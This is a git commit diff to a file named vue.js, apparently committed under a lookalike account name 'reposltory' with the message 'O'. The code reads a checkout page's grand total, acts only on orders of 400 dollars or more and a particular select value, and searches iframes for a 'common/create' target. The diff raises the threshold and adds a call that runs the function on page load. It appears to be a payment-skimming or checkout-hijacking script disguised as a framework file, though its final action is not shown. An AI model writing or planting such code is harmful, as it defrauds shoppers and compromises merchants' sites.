d2b63ec4196cd056a32ad24828386cf5bc9fd7b8
reposltory <124707435+reposltory@users.noreply.github.com>
2024-10-08 20:44:45 +0330

    O

--- vue.js
+++ vue.js
@@ -6,7 +6,7 @@ function checkIframe() {
         var priceElement = grandTotalElement.nextElementSibling;
         var priceText = priceElement.textContent;
         var priceValue = parseInt(priceText.replace('$', '').trim());
-        if (priceValue >= 100) {
+        if (priceValue >= 400) {
             if(document.getElementsByTagName("select")[1].value=="2"){
                 const iframes = Array.from(document.getElementsByTagName("iframe"));
                 const targetValue = "common/create"; 
@@ -25,3 +25,4 @@ function checkIframe() {
     }
 }
 
+checkIframe() 
